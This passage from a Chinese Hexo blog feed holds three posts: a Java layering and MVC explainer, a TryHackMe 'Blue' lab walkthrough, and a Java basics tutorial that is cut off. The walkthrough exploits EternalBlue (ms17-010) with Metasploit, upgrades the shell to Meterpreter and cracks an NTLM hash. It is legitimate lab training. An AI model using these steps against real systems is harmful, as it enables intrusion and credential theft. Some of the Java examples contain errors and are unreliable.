awk">https:<span class="hljs-regexp">//gi</span>tee.com<span class="hljs-regexp">/y_project/</span>RuoYi-Cloud<br></code></pre></td></tr></table></figure><h1 id="JAVA分层思想与MVC模式"><a href="#JAVA分层思想与MVC模式" class="headerlink" title="JAVA分层思想与MVC模式"></a>JAVA分层思想与MVC模式</h1><h2 id="1、分层讲解"><a href="#1、分层讲解" class="headerlink" title="1、分层讲解"></a>1、分层讲解</h2><p>Java 分层思想是一种软件架构设计理念，旨在将一个复杂的系统划分为多个相对独立且互相关联的层次，每个层次负责不同的功能，以实现高内聚、低耦合的设计。这种思想有助于提高代码的可维护性、可扩展性，并使团队更容易协同工作。以下是Java分层思想的主要层次：</p><p><strong>表现层（Presentation Layer）：</strong> 主要负责与用户交互，处理用户界面和用户输入输出。在 Java 中，通常由 Servlet、JSP、或者更现代的框架如 Spring MVC 负责、或者 Springboot 下的 Controller 层。</p><p><strong>业务层（Business Layer）：</strong> 业务层包含应用程序的业务逻辑，处理业务规则和数据处理。这一层通常由 JavaBean、Service 等组成，负责执行具体的业务操作。</p><p><strong>服务层（Service Layer）：</strong> 服务层是业务层的一部分，提供业务逻辑的具体实现。在 Spring 框架中，使用 @Service 注解来表示服务层。</p><p><strong>持久层（Persistence Layer）：</strong> 持久层负责数据的持久化，通常与数据库交互。在 Java 中，常见的持久层技术包括 JDBC、Hibernate、MyBatis 等。</p><p><strong>数据访问层（Data Access Layer）：</strong> 这一层是持久层的一部分，负责封装数据访问细节，提供统一的接口给业务层。通常由 DAO（Data Access Object）组成。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611117.png" alt="Java分层"></p><p>通过明确划分这些层次，开发人员可以更容易地理解、维护和扩展代码。这种分层思想还有助于实现模块化开发，每个层次都可以独立测试和替换，从而提高系统的可测试性和灵活性。在实际应用中，可以根据项目的规模和需求进行适度的调整和扩展。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.cnblogs.com/java-<span class="hljs-number">123</span>/p/<span class="hljs-number">9174547</span>.html<br></code></pre></td></tr></table></figure><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>老规矩，看pom.xml</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611136.png" alt="image-20240418124124507"></p><p>看看有没有报红的地方，那里可能依赖还没有缓存好（刚打开要先等等）</p><p>再看看rbac.sql</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611122.png" alt="image-20240418124136004"></p><p>把它导入到我们的数据库中</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611131.png" alt="image-20240418124632503"></p><p>首先我们可以看到数据库名称是rbac</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611148.png" alt="image-20240418124824388"></p><p>我们也创建一个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611152.png" alt="image-20240418124949474"></p><p>然后再导入（<strong>注意这里不用加分号</strong>）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611344.png" alt="image-20240418125147945"></p><p>还是刚才application.yml那，记得改账号密码</p><p>然后开始看分层</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611365.png" alt="image-20240418125925091"></p><p><code>annotation</code>：放置项目自定义注解</p><p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p><p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p><p><code>entity/</code>: 存放实体类</p><p><code>interceptor/</code>: 拦截器</p><p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p><p><code>utils/</code>: 存放工具类</p><p><code>dto/</code>: 存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p><p><code>vo/</code>: 视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p><p><code>constant/</code>: 存放常量</p><p><code>filter/</code>: 存放过滤器 </p><h3 id="resources-目录"><a href="#resources-目录" class="headerlink" title="resources 目录"></a>resources 目录</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611387.png" alt="image-20240418141440412"></p><p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p><p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p><p><code>templates/</code>: 存放模版文件</p><p><code>application.properties</code>或<code>application.yml</code>: Spring Boot默认配置文件</p><h1 id="Java-MVC-模式"><a href="#Java-MVC-模式" class="headerlink" title="Java MVC 模式"></a>Java MVC 模式</h1><h2 id="1、模式讲解"><a href="#1、模式讲解" class="headerlink" title="1、模式讲解"></a>1、模式讲解</h2><p>MVC 即模型（Model） 、视图（View）、控制器（Controller）。</p><p>MVC（Model-View-Controller）是一种软件架构模式，用于设计和组织代码。它将一个应用程序分为三个主要组件：模型（Model）、视图（View）和控制器（Controller）。每个组件有不同的责任，以实现代码的分离和模块化，以便更容易维护和扩展应用程序。</p><p>通俗来说，各司其职高效完成任务。</p><ul><li>模型（Model）</li></ul><p>模型是用于处理数据逻辑的部分。</p><p>所谓数据逻辑，也就是数据的映射以及对数据的增删改查，Bean、DAO（data access object，数据访问对象）等都属于模型部分。</p><ul><li>视图（View）</li></ul><p>视图负责数据与其它信息的显示，也就是给用户看到的页面。</p><p>html、JSP 等页面都可以作为视图。</p><ul><li>控制器（controller）</li></ul><p>控制器是模型与视图之间的桥梁，控制着数据与用户的交互。</p><p>控制器通常负责从视图读取数据，处理用户输入，并向模型发送数据，也可以从模型中读取数据，再发送给视图，由视图显示。</p></servlet>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY2-Blue</title>
    <link href="/2024/06/15/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY2-Blue/"/>
    <url>/2024/06/15/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY2-Blue/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY2-Blue"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY2-Blue" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY2-Blue"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY2-Blue</h1><p><a href="https://tryhackme.com/room/blue#">TryHackMe的 |蓝 — TryHackMe | Blue</a>（永恒之蓝，比较经典的靶场了）</p><p><a href="https://baike.baidu.com/item/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/4951714">永恒之蓝_百度百科 (baidu.com)</a></p><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508948.png" alt="image-20240313215638733"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508422.png" alt="image-20240313220456332"></p><p>-sV 版本探测<br>-vv 对结果的详细输出<br>–script 指定使用的nmap脚本，可以理解为插件，这里使用的是vuln脚本，负责检查目标机是否有常见的漏洞</p><p>(这里不知道为什么虚拟机里的kali死活扫不出结果，所以用了thm的机子，用xshell连上使用)</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508717.png" alt="image-20240313221806431"></p><p>这是扫描出来的结果</p><p>第二个问题答案显而易见，3个</p><p>第三个问题也可以看见 ms17-010（永恒之蓝）</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里的知识点主要是对nmap插件的使用，对一些常见漏洞的识别</p><p>–script vuln</p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508670.png" alt="image-20240313222107661"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508343.png" alt="image-20240313222320863"></p><p>msfconsole</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509162.png" alt="image-20240313222354486"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509398.png" alt="image-20240313222827467"></p><p>0是我们需要的载荷，win7永恒之蓝</p><p>1是永恒浪漫，也是ms17-010的利用方式，具体区别可以自行百度</p><p>2和3 是auxiliary模块，即测试模块，测试是否可以利用该漏洞</p><p>4是DoublePulsar双脉冲星，nsa武器库之一</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509092.png" alt="image-20240313223421432"></p><p>RHOSTS是空的，可见结果是RHOSTS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509241.png" alt="image-20240313225624227"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509833.png" alt="image-20240313230137583"></p><p>这里记得设置我们的rhosts为目标靶机ip</p><p>然后run</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509390.png" alt="image-20240313230924386"></p><p>我们成功连接到目标靶机</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>Metasploit的基本使用</p><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">【工具使用】——Metasploit(MSF)使用详解(超详细)-CSDN博客</a></p><p>可以看看别人的文章多学点</p><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>第三个任务是提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509053.png" alt="image-20240313231109272"></p><p>看看任务清单</p><p>问题一：<a href="https://blog.csdn.net/weixin_43379478/article/details/85720083">Metasploit中将shell升级为metepreter shell_metasploit 标准shell 升级到完整shell-CSDN博客</a></p><p>post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</p><p>问题二我直接跟着上面做了，没留意还要看我们要改哪个选项，提前改成了session 1，正常来说这里session那里应该是空着的</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509017.png" alt="image-20240313233149512"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509421.png" alt="image-20240313233401446"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509246.png" alt="image-20240313233508847"></p><p>介绍另外一种方法，我们其实可以简单的通过<code>sessions -u TARGET_ID</code>就可以将普通cmdshell升级成msfshell了，它的效果和我们上述的效果是一样的，但是在渗透测试类的比赛中很实用，速度很快。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509144.png" alt="image-20240313233650302"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509430.png" alt="image-20240313233814989"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509778.png" alt="image-20240313233918197"></p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>跟上一个差不多，仍是metasploit的使用，这个是提权</p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>我们的任务是破解密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509030.png" alt="image-20240313234049777"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510706.png" alt="image-20240313234038667"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510935.png" alt="image-20240313234322560"></p><p>真服了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510073.png" alt="image-20240313234610191"></p><p>找了个别的网站</p><p><a href="https://hashes.com/zh/decrypt/hash">MD5 在線免費解密 MD5、SHA1、MySQL、NTLM、SHA256、SHA512、Wordpress、Bcrypt 的雜湊 (hashes.com)</a></p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>简单的密码破解</p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><p>找flag，熟悉，太熟悉了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510869.png" alt="image-20240313234842495"></p><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510183.png" alt="image-20240313235029197"></p><p>好吧也没这么熟，win的一些指令还是不记得</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510119.png" alt="image-20240313235227106"></p><p>他这里删除键什么的用不了不知道为什么</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141511119.png" alt="image-20240313235453118"></p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>这里很明显对windows命令的不熟悉，还得练</p><p><a href="https://zhuanlan.zhihu.com/p/468515490">Windows CMD常用命令大全（值得收藏） - 知乎 (zhihu.com)</a></p><p>也挂上一个链接（都是百度搜到的第一个）</p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p><a href="https://blog.csdn.net/qq_25755011/article/details/113663910">TryHackMe | Blue Writeup （超干货详细msf渗透使用指南）-CSDN博客</a>（个人感觉写的真的非常详细了）</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础</title>
    <link href="/2024/06/14/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/06/14/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA基础"><a href="#JAVA基础" class="headerlink" title="JAVA基础"></a>JAVA基础</h1><h2 id="1-项目搭建"><a href="#1-项目搭建" class="headerlink" title="1.项目搭建"></a>1.项目搭建</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121720.png" alt="image-20240409203002258"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121467.png" alt="image-20240409203045634"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121615.png" alt="image-20240409203249150"></p><h2 id="2-常见关键字"><a href="#2-常见关键字" class="headerlink" title="2.常见关键字"></a>2.常见关键字</h2><p>Java 关键字是对 Java编译器有特殊含义的字符串，是编译器和程序员的一个约定，程序员利用关键字来告诉编译器其声明的变量类型、类、方法特性等信息。</p><table><thead><tr><th align="center">关键字</th><th align="center">关键字</th><th align="center">关键字</th><th align="center">关键字</th></tr></thead><tbody><tr><td align="center">abstract</td><td align="center">assert</td><td align="center">boolean</td><td align="center">break</td></tr><tr><td align="center">byte</td><td align="center">case</td><td align="center">catch</td><td align="center">char</td></tr><tr><td align="center">class</td><td align="center">const</td><td align="center">continue</td><td align="center">default</td></tr><tr><td align="center">do</td><td align="center">double</td><td align="center">else</td><td align="center">enum</td></tr><tr><td align="center">extends</td><td align="center">final</td><td align="center">finally</td><td align="center">float</td></tr><tr><td align="center">for</td><td align="center">goto</td><td align="center">if</td><td align="center">implements</td></tr><tr><td align="center">import</td><td align="center">instanceof</td><td align="center">int</td><td align="center">interface</td></tr><tr><td align="center">long</td><td align="center">native</td><td align="center">new</td><td align="center">package</td></tr><tr><td align="center">private</td><td align="center">protected</td><td align="center">public</td><td align="center">return</td></tr><tr><td align="center">short</td><td align="center">static</td><td align="center">strictfp</td><td align="center">super</td></tr><tr><td align="center">switch</td><td align="center">synchronized</td><td align="center">this</td><td align="center">throw</td></tr><tr><td align="center">throws</td><td align="center">transient</td><td align="center">try</td><td align="center">void</td></tr><tr><td align="center">volatile</td><td align="center">while</td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="3-修饰符"><a href="#3-修饰符" class="headerlink" title="3.修饰符"></a>3.修饰符</h2><p>public</p><p><strong>·含义</strong>：完全公开，可在任意地方访问</p><p><strong>·使用场景</strong>：希望类的实例能在任意地方被创建和访问，或者编写库(library)的一部分，希望其他开发者能使用这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span>&#123;<br>    <span class="hljs-comment">//类的定义</span><br>&#125;<br></code></pre></td></tr></table></figure><p>default</p><p><strong>·含义</strong>：没有使用任何修饰符，默认可见性为包级别，只能在同一个包访问</p><p><strong>·使用场景</strong>：希望类在同一个包的其它类能够访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span>&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>protected</p><p><strong>·含义</strong>：可以被同一个包的其它类访问，以及该类的子类（无论在哪个包）</p><p><strong>·使用场景</strong>：通常用于修饰成员变量和方法，当你希望子类能够访问类的成员，但其它类不能访问时使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span>&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>private</p><p><strong>·含义</strong>：使用private修饰符的类只能被同一类中其他类访问，通常用于嵌套类或内部实现细节</p><p><strong>·使用场景</strong>：将类的细节隐藏在同一类的内部，不让其他类直接访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span> &#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>举例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OuterClass</span>&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-数据类型"><a href="#4-数据类型" class="headerlink" title="4.数据类型"></a>4.数据类型</h2><p>整型：byteshortintlong</p><p>浮点型：floatdouble</p><p>字符型：char</p><p>布尔型：boolean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">integerVariable</span> <span class="hljs-operator">=</span> <span class="hljs-number">1111</span>;<br><span class="hljs-type">double</span> <span class="hljs-variable">doubleVariable</span> <span class="hljs-operator">=</span> <span class="hljs-number">11.11</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">charVariable</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;E&#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">booleanVariable</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>/<span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><h2 id="5-变量"><a href="#5-变量" class="headerlink" title="5.变量"></a>5.变量</h2><p>先声明后使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">11</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;e1even&quot;</span>;        <span class="hljs-comment">//String是引用数据类型，是一个类</span><br></code></pre></td></tr></table></figure><h2 id="6-基本运算符"><a href="#6-基本运算符" class="headerlink" title="6.基本运算符"></a>6.基本运算符</h2><p>算术运算符：+-*&#x2F;%++–</p><p>关系运算符：&#x3D;&#x3D;!&#x3D;&lt;&gt;&lt;&#x3D;&gt;&#x3D;</p><p>逻辑运算符：&amp;&amp;||!</p><p>​  与 或     非</p><p>与：都真才真</p><p>或：有假则假</p><p>非：取相反的</p><p>位运算符：&amp;|^~&lt;&lt;&gt;&gt;&gt;&gt;&gt;</p><h2 id="7-顺序结构"><a href="#7-顺序结构" class="headerlink" title="7.顺序结构"></a>7.顺序结构</h2><p>逐行执行</p><h2 id="8-选择结构"><a href="#8-选择结构" class="headerlink" title="8.选择结构"></a>8.选择结构</h2><p>选择执行不同</p><p>if</p><p>if-else(else if)</p><p>switch</p><h2 id="9-循环结构"><a href="#9-循环结构" class="headerlink" title="9.循环结构"></a>9.循环结构</h2><p>多次执行相同</p><p>for（跟c格式差不多）</p><p>while</p><p>do-while</p><h2 id="10-数组"><a href="#10-数组" class="headerlink" title="10.数组"></a>10.数组</h2><p>存储相同类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] numbers=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><h2 id="11-函数"><a href="#11-函数" class="headerlink" title="11.函数"></a>11.函数</h2><p> 方法名，参数列表，返回类型和方法体</p><p>普通方法：实例化对象调用</p><p>静态方法：通过类名直接调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">common</span>&#123;<br><span class="hljs-comment">//普通方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printMessage</span><span class="hljs-params">(String message)</span>&#123;<br>System.out.println(message);<br>&#125;<br><span class="hljs-comment">//静态方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">common</span> <span class="hljs-variable">myObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">common</span>();<br>        myObject.printMessage(<span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>无返回值：void</p><h2 id="12-JAVA异常处理"><a href="#12-JAVA异常处理" class="headerlink" title="12.JAVA异常处理"></a>12.JAVA异常处理</h2><p>try:尝试运行</p><p>catch:如果try中发生异常，跳转到catch。并且捕获异常</p><p>finally:无论是否发生异常都运行，通常用于释放或清理工作</p><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>把一些事物抽象成对象</p><p>如一个积木块</p><p>有它的<strong>属性</strong>：形状，颜色，大小</p><p>也有<strong>行为</strong>：如何拼接在一起</p><h2 id="1-类"><a href="#1-类" class="headerlink" title="1.类"></a>1.类</h2><p>两个不同的类别，有着不同的特征和行为</p><p>它定义了对象的属性（成员变量）和行为（方法）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//定义一个person类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br><span class="hljs-keyword">private</span> String features;<br><span class="hljs-keyword">private</span> String job;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-对象"><a href="#2-对象" class="headerlink" title="2.对象"></a>2.对象</h2><p>对象是类的实例</p><p>实例化是为了创建对象，也就是我们使用类这个模板，以及可以进行自己所需的改动；</p><p>例子：我们从网上下载PPT模板，然后修改所需内容</p><p>我们实例化一个对象过程通常包括使用<strong>new</strong>关键字来调用类的构造方法，并为对象分配内存空间 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-comment">//类的属性</span><br>    String name;<br>    <span class="hljs-type">int</span> age;<br>    <br>    <span class="hljs-comment">//类的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;1111&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//实例化</span><br>        <span class="hljs-type">person</span> <span class="hljs-variable">e1even</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">person</span>();<br>        <br>        <span class="hljs-comment">//设置属性值</span><br>        e1even.name=<span class="hljs-string">&quot;e1even&quot;</span>;<br>        e1even.age=<span class="hljs-string">&quot;20&quot;</span>;<br>        <br>        <span class="hljs-comment">//调用</span><br>        e1even.say();<br>        <br>        <span class="hljs-comment">//输出属性值</span><br>        System.out.println(<span class="hljs-string">&quot;名字：&quot;</span> + e1even.name);<br>        System.out.println(<span class="hljs-string">&quot;年龄：&quot;</span> + e1even.age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121001.png" alt="image-20240409232449173"></p><h2 id="3-继承（extends）"><a href="#3-继承（extends）" class="headerlink" title="3.继承（extends）"></a>3.继承（extends）</h2><p>允许一个（子）类继承（父）类的属性和方法。子类可以继承父类的行为，并且可以通过添加新的属性和方法来扩展功能</p><p>解决：代码重用和扩展</p><p>实现：功能的扩展和定制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">zuo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;zuo&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">worker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">People</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">shuo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;shuo&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title 